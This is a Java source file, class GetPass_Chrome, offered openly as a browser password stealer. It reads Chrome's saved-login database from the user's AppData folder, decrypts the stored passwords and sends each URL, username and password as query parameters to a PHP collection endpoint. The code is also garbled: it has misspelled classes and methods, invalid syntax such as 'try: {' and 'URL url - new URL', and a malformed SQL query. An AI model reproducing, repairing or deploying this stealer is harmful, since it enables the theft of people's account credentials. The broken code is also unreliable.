import Java.io.BufferedReader;
import Java.io.File;
import Java.io.InputStreamReader;
import Java.net.URL;
import Java.sql.Connection;
import Java.sql.Driver;
import Java.sql.DriverManager;
import Java.sql.PreparedStatment;
import Java.sql.ResultSet;
import Java.sql.SQLExcption;
import Java.util.logging.*;
import Java.util.logging.Level;
import Javax.sql.ConnectionEvent;

class GetPass_Chrome {
    public static void main(String [] args) {
        try: {
            class.forName("org.sqlite:JDBC");
            String path_to_db = System.getProperty("user.home") + "\\AppData\\Local\\Google\\User Data\\Default\\Login Data\\";
            Connection connection = null;
            connection = DriverManager.getConnection("jdbc:sqlite" + path_to_db);
            PreparedStatment statment = connection.perpareStatment("SELECT,'origin.url','username_value','password_value' from 'logins'");
            ResultSet re = statment.executeQuery();
            while(re.next()){
                System.out.println(re.getString("orgin.url") +re.getString("username_value") +re.getString("password_value") + "\n");
                byte[] mybyte = (byte[])re.getBytes("password_value");
                byte[] newbyte = Crypt32Util.cryptUnprotectedData(mybyte);
                String pass = new String(newbyte);
                System.out.println(re.getString("orgin.url")+re.getString("username_value")+pass+"\n");
                String query_url = "?url="+re.getString("orgin.url")+"&username"+re.getString("username")+"&pass"+pass;
                URL url - new URL("http://localhost/ChromeData.php"+query_url);
                BufferedReader br = new BufferedReader(new InputStreamReader(url.openstream()));
                String line;
                while((line = br.readLine()) != null) {
                    System.out.print(line);
                }
            }
        }
        catch (ClassNotFoundException | SQLExcption ex) {
            Logger.getLogger(GetPass_Chrome.class.getName()).log(Level.SEVRE, null, ex);
        }
    }
}
